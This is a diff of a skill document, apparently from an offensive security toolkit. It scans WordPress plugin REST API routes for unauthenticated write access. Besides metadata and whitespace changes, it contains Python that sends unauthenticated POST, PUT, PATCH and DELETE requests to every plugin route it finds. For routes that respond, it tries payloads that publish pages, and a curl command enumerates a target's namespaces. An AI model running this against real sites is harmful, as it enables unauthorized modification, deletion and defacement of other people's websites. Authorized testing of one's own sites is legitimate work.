@@ -4,15 +4,17 @@ description: Scan WordPress REST API plugin endpoints for unauthenticated state-
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-platforms: [linux, macos, any]
+platforms: [any]
 compatibility: Requires python3, curl
-tags: [recon, wordpress, rest-api, auth-bypass, plugin-exploit, unauthorized-access, content-publishing]
-category: recon
-related_skills:
-  - firebase-supabase-attack
-  - js-secrets-extraction
-  - hunt-api-misconfig
-  - source-leak-hunt
+metadata:
+  tags: [recon, wordpress, rest-api, auth-bypass, plugin-exploit, unauthorized-access, content-publishing]
+  category: recon
+  related_skills:
+    - hunt-firebase
+    - hunt-supabase
+    - js-secrets-extraction
+    - hunt-api-misconfig
+    - source-leak-hunt
 ---
 
 # WordPress Plugin REST API — Auth Bypass
@@ -30,6 +32,17 @@ WordPress plugins register custom REST API routes at `/wp-json/{namespace}/`. Ma
 
 - `python3` with `requests` library.
 - Target WordPress site URL.
+
+## How to Run
+
+```bash
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/wp-json/" | python3 -c "
+import sys, json
+data = json.load(sys.stdin)
+for ns in data.get('namespaces', []):
+    print(ns)
+"
+```
 
 ## Procedure
 
@@ -152,22 +165,22 @@ for ns in plugins:
     if r.status_code != 200:
         continue
     routes = r.json().get('routes', {})
-    
+
     for path, cfg in routes.items():
         methods = cfg.get('methods', [])
         for method in methods:
             if method not in ['POST', 'PUT', 'PATCH', 'DELETE']:
                 continue
-            
+
             # Test without auth
             r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)
-            
+
             if r.status_code == 200:
                 text = r.text.lower()
                 if 'forbidden' not in text and 'not allowed' not in text and 'rest_cannot' not in text:
                     print(f"\n⚠️ UNPROTECTED: [{method}] {ns}{path}")
                     print(f"   {r.text[:300]}")
-                    
+
                     # Try common payloads
                     for payload in [
                         {"title": "test", "content": "test", "status": "publish", "post_type": "page"},
